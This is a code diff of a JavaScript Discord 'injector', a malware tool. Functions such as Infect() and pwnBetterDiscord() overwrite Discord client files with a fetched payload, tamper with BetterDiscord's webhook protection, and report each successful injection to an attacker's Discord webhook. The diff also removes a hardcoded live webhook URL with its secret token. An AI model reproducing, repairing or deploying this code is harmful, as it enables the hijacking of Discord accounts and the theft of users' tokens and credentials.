@@ -1,18 +1,20 @@
+
+// Code is shit
 var glob = require("glob");
 const fs = require('fs');
 const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
+const webhook = "da_webhook"
 
 const config = {
-    "logout": "instant",
-    "inject-notify": "true",
-    "logout-notify": "true",
-    "init-notify":"true",
-    "embed-color": "3447704",
-    "disable-qr-code": "true",
-    "dualHook": "https://discord.com/api/webhooks/939079528045772800/YrAYG7QDaAiDJyt25XY-dDEZ_7sQt3daaLAKT6LjHCE8m-IDbCrMQ0pAUSSgcIa6mu3O"
+    "logout": "%LOGOUT%1",
+    "inject-notify": "%INJECTNOTI%1",
+    "logout-notify": "%LOGOUTNOTI%1",
+    "init-notify":"%INITNOTI%1",
+    "embed-color": "%MBEDCOLOR%1",
+    "disable-qr-code": "%DISABLEQRCODE%1"
 }
 
 
@@ -48,7 +50,7 @@ function Infect() {
         });
         resp.on('end', () => {
             injectPath.forEach(file => {
-                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("https://discord.com/api/webhooks/939079528045772800/YrAYG7QDaAiDJyt25XY-dDEZ_7sQt3daaLAKT6LjHCE8m-IDbCrMQ0pAUSSgcIa6mu3O", dualHook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
+                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
                     encoding: 'utf8',
                     flag: 'w'
                 });
@@ -145,7 +147,7 @@ function pwnBetterDiscord() {
     var dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
     if (fs.existsSync(dir)) {
         var x = fs.readFileSync(dir)
-        fs.writeFileSync(dir, buf_replace(x, "https://discord.com/api/webhooks/939079528045772800/YrAYG7QDaAiDJyt25XY-dDEZ_7sQt3daaLAKT6LjHCE8m-IDbCrMQ0pAUSSgcIa6mu3O", "stanleyisgod"))
+        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "stanleyisgod"))
     } else {
         return;
     }
@@ -157,7 +159,7 @@ function injectNotify() {
     var fields = [];
     injectPath.forEach( path => {
         var c = {
-            name: "",
+            name: ":syringe: Inject Path",
             value: `\`\`\`${path}\`\`\``,
             inline: !1
         }
@@ -165,17 +167,17 @@ function injectNotify() {
     })
     axios
 	.post(webhook, {
-        "content": "@everyone 🕵️ Successfull injection",
+        "content": "@everyone :detective: Successfull injection",
         "embeds": [
           {
             "title": "",
             "color": config["embed-color"],
             "fields": fields,
             "author": {
-              "name": ""
+              "name": "LIL SKID"
             },
             "footer": {
-              "text": ""
+              "text": "LIL SKID"
             }
           }
         ]
@@ -187,3 +189,4 @@ function injectNotify() {
     })
 
 }
+
